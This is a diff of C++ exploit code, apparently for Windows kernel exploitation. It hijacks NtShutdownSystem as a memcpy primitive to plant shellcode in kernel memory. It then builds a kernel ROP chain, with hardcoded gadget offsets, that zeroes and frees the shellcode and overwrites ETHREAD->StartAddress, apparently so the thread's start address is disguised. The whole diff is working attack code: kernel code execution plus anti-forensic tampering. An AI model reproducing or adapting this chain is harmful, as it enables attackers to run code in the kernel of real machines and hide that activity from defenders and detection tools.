@@ -47,40 +47,26 @@ int main()
     reinterpret_cast<void*(*)(void*, void*, size_t)>(NtShutdownSystem)(ShellcodeAllocation, &ShellcodeTemplate, sizeof(ShellcodeTemplate));
     KernelCaller.DisableRedirectByName("NtShutdownSystem");
 
-    // Setup new rbp for pivoting
-    void* NewRbpAddress = (void*)((uintptr_t)StackAllocation + 0x3000);
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, &NewRbpAddress, sizeof(void*));
-    KernelCaller.DisableRedirectByName("NtShutdownSystem");
-    // Write rop gadgets
-    void* SizeOfShellcode = (void*)(sizeof(ShellcodeTemplate));
-    void* PopRaxGadget = (void*)(Driver::GetKernelModuleBase() + 0x210e10); // pop rax; ret;
-    void* PopRcxGadget = (void*)(Driver::GetKernelModuleBase() + 0x256c4a); // pop rcx; ret;
-    void* PopRdxGadget = (void*)(Driver::GetKernelModuleBase() + 0x3cca89); // pop rdx; ret;
-    void* RtlZeroMemoryAddress = (void*)(Driver::GetKernelModuleBase() + Driver::GetKernelFunctionOffset("RtlZeroMemory"));
-    void* CallRbxGadget = (void*)(Driver::GetKernelModuleBase() + 0x6a9edf);// call rax; nop dword ptr [rax]; add rsp, 8; ret;
-    void* PaddingAddress = (void*)0xC0FEBABEC0FEBABE;
-    void* ReturnAddress = (void*)0xDEADBEEFDEADBEEF;
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
-    // pop rcx;
-    // <ptr to shellcode alloc>
-    // pop rdx;
-    // <size of shellcode alloc>
-    // pop rbx;
-    // <ptr to RtlZeroMemory>
-    // call rax; nop dword ptr [rax]; add rsp, 8; ret;
-    // 8 byte padding to account for "add rsp, 8" side-effect
-    // <return addr>
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 1), &PopRcxGadget, sizeof(void*));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 2), &ShellcodeAllocation, sizeof(void*));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 3), &PopRdxGadget, sizeof(void*));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 4), &SizeOfShellcode, sizeof(void*));
+    StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));
+    KernelStackManager.AddFunctionCall<std::uintptr_t, std::size_t>("RtlZeroMemory",
+        reinterpret_cast<std::uintptr_t>(ShellcodeAllocation),
+        (std::size_t)sizeof(ShellcodeTemplate)
+    );
+    KernelStackManager.AddFunctionCall<std::uintptr_t>("ExFreePool",
+        reinterpret_cast<std::uintptr_t>(ShellcodeAllocation)
+    );
+    KernelStackManager.AddFunctionCall("PsGetCurrentThread");
+    KernelStackManager.AddGadget(0x256c4a); // pop rcx; ret;
+    KernelStackManager.AddValue(0x4e0); // 0x4e0 (offset to ETHREAD->StartAddress)
+    KernelStackManager.AddGadget(0x28efa4); // add rax, rcx; ret;
 
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 5), &PopRaxGadget, sizeof(void*));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 6), &RtlZeroMemoryAddress, sizeof(void*));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 7), &CallRbxGadget, sizeof(void*));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 8), &PaddingAddress, sizeof(void*)); // +8 padding
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 8 * 9), &ReturnAddress, sizeof(void*));
+    KernelStackManager.AddGadget(0x2f7921); // pop r8; ret;
+    KernelStackManager.AddValue(0xDEADBEEFDEADBEEF); // New value we write to ETHREAD->StartAddress
+    KernelStackManager.AddGadget(0x3c3a81); // mov qword ptr [rax], r8; ret;
+    
+
+    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
     KernelCaller.DisableRedirectByName("NtShutdownSystem");
 
     Sleep(500);
